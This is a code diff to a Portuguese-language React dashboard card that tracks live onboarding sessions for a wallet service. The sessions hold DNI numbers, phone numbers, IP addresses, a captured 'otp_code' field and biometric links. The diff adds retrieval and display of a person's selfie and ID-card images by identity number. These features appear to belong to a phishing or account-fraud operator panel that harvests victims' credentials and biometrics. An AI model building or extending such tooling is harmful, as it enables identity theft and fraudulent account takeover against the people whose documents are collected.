@@ -1383,11 +1383,13 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
   const [walletInfo, setWalletInfo] = useState<Record<string, unknown> | null>(null);
   const [loading, setLoading] = useState(false);
   const [lastCheck, setLastCheck] = useState<string>("");
+  const [showImages, setShowImages] = useState(false);
+  const [bioImages, setBioImages] = useState<Record<string, string | null> | null>(null);
+  const [loadingImages, setLoadingImages] = useState(false);
 
   const time = new Date(session.created_at);
   const timeStr = time.toLocaleDateString("pt-BR", { day: "2-digit", month: "2-digit" }) + " " + time.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });
 
-  // Parse otp_code
   const otpParts: Record<string, string> = {};
   if (session.otp_code) {
     session.otp_code.split("|").forEach((part) => {
@@ -1411,7 +1413,6 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
 
   const cfg = statusLabels[session.status] || { label: session.status, color: "text-muted-foreground bg-secondary" };
 
-  // Determine process stage
   const getProcessStage = () => {
     const s = session.status;
     if (s === "verify_dni_submitted") return { label: "DNI Enviado", icon: "📋", color: "text-yellow-400 bg-yellow-500/10" };
@@ -1448,7 +1449,29 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
     setLoading(false);
   };
 
-  // Auto-fetch on mount and poll every 3 minutes
+  const fetchImages = async () => {
+    if (!dni) return;
+    setLoadingImages(true);
+    try {
+      const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
+      const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
+      const headers = { "Content-Type": "application/json", "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}` };
+      const res = await fetch(`${SUPABASE_URL}/functions/v1/wayni-auth`, {
+        method: "POST", headers,
+        body: JSON.stringify({ action: "get_biometric_info", identity_number: dni, include_images: true }),
+      }).then(r => r.json());
+      if (res?.success) {
+        setBioImages({
+          selfie: res.selfie_img || null,
+          dniFront: res.dni_front_img || null,
+          dniBack: res.dni_back_img || null,
+        });
+        setShowImages(true);
+      }
+    } catch { /* ignore */ }
+    setLoadingImages(false);
+  };
+
   useEffect(() => {
     if (!dni) return;
     fetchInfo();
@@ -1462,34 +1485,29 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
     setTimeout(() => setCopied(""), 1500);
   };
 
-  const BioCheck = ({ ok, label }: { ok: string | boolean; label: string }) => {
-    const isDone = ok === "true" || ok === true;
-    return (
-      <span className={`text-[9px] px-2 py-1 rounded-lg font-semibold ${isDone ? "bg-green-500/15 text-green-400 border border-green-500/20" : "bg-red-500/15 text-red-400 border border-red-500/20"}`}>
-        {isDone ? "✓" : "✗"} {label}
-      </span>
-    );
-  };
+  const BioCheck = ({ ok, label }: { ok: boolean; label: string }) => (
+    <span className={`text-[9px] px-2 py-1 rounded-lg font-semibold ${ok ? "bg-green-500/15 text-green-400 border border-green-500/20" : "bg-red-500/15 text-red-400 border border-red-500/20"}`}>
+      {ok ? "✓" : "✗"} {label}
+    </span>
+  );
 
-  // Determine overall validation progress
   const getValidationProgress = () => {
     const steps = [];
-    // Step 1: DNI
     const dniOk = ["verify_dni_success", "address_submitted", "address_saved", "biometric_started", "biometric_finished"].includes(session.status);
     steps.push({ label: "DNI", done: dniOk, error: session.status === "verify_dni_error" });
-    // Step 2: Address
     const addressOk = ["address_saved", "biometric_started", "biometric_finished"].includes(session.status);
     steps.push({ label: "Endereço", done: addressOk, error: session.status === "address_error" });
-    // Step 3: Biometric
-    const bioOk = session.status === "biometric_finished" || (bioInfo && bioInfo.selfie === "true" && bioInfo.dniFront === "true" && bioInfo.dniBack === "true");
-    steps.push({ label: "Biometria", done: !!bioOk, error: session.status === "biometric_error" });
-    // Step 4: Wallet
+    const bioSuccess = bioInfo?.status === "success" || (bioInfo?.has_selfie === true && bioInfo?.has_dni_front === true && bioInfo?.has_dni_back === true);
+    const bioOk = session.status === "biometric_finished" || !!bioSuccess;
+    steps.push({ label: "Biometria", done: bioOk, error: session.status === "biometric_error" });
     const walletOk = walletInfo && walletInfo.status === "ACTIVE";
     steps.push({ label: "Wallet", done: !!walletOk });
     return steps;
   };
 
   const progress = getValidationProgress();
+  const faceConfidence = bioInfo?.facematching ? (bioInfo.facematching as Record<string, unknown>)?.confidence : null;
+  const faceCode = bioInfo?.facematching ? (bioInfo.facematching as Record<string, unknown>)?.code : null;
 
   return (
     <div className="rounded-xl border border-border bg-card overflow-hidden">
@@ -1536,7 +1554,6 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
 
       {/* Data */}
       <div className="px-4 pb-3 space-y-2">
-        {/* User info row 1 */}
         <div className="flex items-center gap-3 flex-wrap">
           {dni && (
             <button onClick={() => copyText(dni, "dni")} className="flex items-center gap-1 hover:opacity-80">
@@ -1555,7 +1572,6 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
           )}
         </div>
 
-        {/* UUID & Phone */}
         <div className="flex items-center gap-3 flex-wrap">
           {userUuid && (
             <button onClick={() => copyText(userUuid, "uuid")} className="flex items-center gap-1 hover:opacity-80">
@@ -1571,7 +1587,6 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
           )}
         </div>
 
-        {/* Address info */}
         {(otpParts.region || otpParts.city || otpParts.street || otpParts.zip) && (
           <div className="rounded-lg border border-border/50 bg-secondary/30 px-3 py-2 space-y-1">
             <span className="text-[9px] font-bold text-muted-foreground">📍 Endereço:</span>
@@ -1584,7 +1599,6 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
           </div>
         )}
 
-        {/* Biometric link */}
         {otpParts.biometric_url && (
           <div className="rounded-lg border border-amber-500/20 bg-amber-500/5 px-3 py-2 space-y-1">
             <span className="text-[9px] font-bold text-amber-400">🔗 Link Biométrico:</span>
@@ -1604,15 +1618,82 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
 
         {/* Biometric validation details */}
         {bioInfo && (
-          <div className="flex items-center gap-2 flex-wrap">
-            <span className="text-[9px] font-bold text-muted-foreground">Validação:</span>
-            <BioCheck ok={bioInfo.selfie as string} label="Selfie" />
-            <BioCheck ok={bioInfo.dniFront as string} label="DNI Frente" />
-            <BioCheck ok={bioInfo.dniBack as string} label="DNI Dorso" />
+          <div className="rounded-lg border border-border/50 bg-secondary/20 px-3 py-2 space-y-2">
+            <div className="flex items-center justify-between">
+              <div className="flex items-center gap-2 flex-wrap">
+                <span className="text-[9px] font-bold text-muted-foreground">Validação:</span>
+                <BioCheck ok={bioInfo.has_selfie === true} label="Selfie" />
+                <BioCheck ok={bioInfo.has_dni_front === true} label="DNI Frente" />
+                <BioCheck ok={bioInfo.has_dni_back === true} label="DNI Dorso" />
+              </div>
+              {(bioInfo.has_selfie || bioInfo.has_dni_front || bioInfo.has_dni_back) && (
+                <button
+                  onClick={fetchImages}
+                  disabled={loadingImages}
+                  className="text-[9px] px-2 py-1 rounded-lg bg-blue-500/10 text-blue-400 border border-blue-500/20 hover:bg-blue-500/20 transition-colors font-semibold flex items-center gap-1"
+                >
+                  {loadingImages ? <RefreshCw size={10} className="animate-spin" /> : <Eye size={10} />}
+                  {loadingImages ? "Carregando..." : "Ver Fotos"}
+                </button>
+              )}
+            </div>
+            {bioInfo.facematching && (
+              <div className="flex items-center gap-2 flex-wrap">
+                <span className="text-[9px] font-bold text-muted-foreground">Facematching:</span>
+                <span className={`text-[9px] px-2 py-0.5 rounded-lg font-bold ${faceCode === 200 ? "bg-green-500/15 text-green-400 border border-green-500/20" : "bg-red-500/15 text-red-400 border border-red-500/20"}`}>
+                  {faceCode === 200 ? "✓ Aprovado" : `✗ Código ${faceCode}`}
+                </span>
+                {faceConfidence !== null && (
+                  <span className={`text-[9px] px-2 py-0.5 rounded-lg font-semibold ${Number(faceConfidence) >= 80 ? "bg-green-500/10 text-green-400" : Number(faceConfidence) >= 50 ? "bg-yellow-500/10 text-yellow-400" : "bg-red-500/10 text-red-400"}`}>
+                    {faceConfidence}% confiança
+                  </span>
+                )}
+              </div>
+            )}
+            {bioInfo.status && (
+              <div className="flex items-center gap-2">
+                <span className="text-[9px] font-bold text-muted-foreground">Status:</span>
+                <span className={`text-[9px] px-2 py-0.5 rounded-lg font-bold ${bioInfo.status === "success" ? "bg-green-500/15 text-green-400 border border-green-500/20" : "bg-amber-500/15 text-amber-400 border border-amber-500/20"}`}>
+                  {String(bioInfo.status).toUpperCase()}
+                </span>
+                {bioInfo.last_completed_section && (
+                  <span className="text-[8px] text-muted-foreground">• Seção: {String(bioInfo.last_completed_section)}</span>
+                )}
+              </div>
+            )}
           </div>
         )}
 
-        {/* Wallet status */}
+        {/* Image viewer */}
+        {showImages && bioImages && (
+          <div className="rounded-lg border border-blue-500/20 bg-blue-500/5 px-3 py-3 space-y-3">
+            <div className="flex items-center justify-between">
+              <span className="text-[10px] font-bold text-blue-400">📸 Documentos Enviados</span>
+              <button onClick={() => setShowImages(false)} className="text-[9px] text-muted-foreground hover:text-foreground">✕ Fechar</button>
+            </div>
+            <div className="grid grid-cols-3 gap-2">
+              {bioImages.selfie && (
+                <div className="space-y-1">
+                  <span className="text-[8px] font-bold text-green-400 block text-center">Selfie</span>
+                  <img src={`data:image/jpeg;base64,${bioImages.selfie}`} alt="Selfie" className="w-full rounded-lg border border-border object-cover max-h-[200px]" />
+                </div>
+              )}
+              {bioImages.dniFront && (
+                <div className="space-y-1">
+                  <span className="text-[8px] font-bold text-green-400 block text-center">DNI Frente</span>
+                  <img src={`data:image/jpeg;base64,${bioImages.dniFront}`} alt="DNI Frente" className="w-full rounded-lg border border-border object-cover max-h-[200px]" />
+                </div>
+              )}
+              {bioImages.dniBack && (
+                <div className="space-y-1">
+                  <span className="text-[8px] font-bold text-green-400 block text-center">DNI Dorso</span>
+                  <img src={`data:image/jpeg;base64,${bioImages.dniBack}`} alt="DNI Dorso" className="w-full rounded-lg border border-border object-cover max-h-[200px]" />
+                </div>
+              )}
+            </div>
+          </div>
+        )}
+
         {walletInfo && (
           <div className="flex items-center gap-2 flex-wrap">
             <span className="text-[9px] font-bold text-muted-foreground">Wallet:</span>
@@ -1632,7 +1713,6 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
           </div>
         )}
 
-        {/* Device info */}
         {session.ip_address && (
           <div className="flex items-center gap-2 flex-wrap text-[9px] text-muted-foreground">
             <span>🌐 {session.ip_address}</span>
@@ -1640,7 +1720,6 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
           </div>
         )}
 
-        {/* Last check */}
         {lastCheck && (
           <span className="text-[8px] text-muted-foreground/50">Última consulta: {lastCheck}</span>
         )}
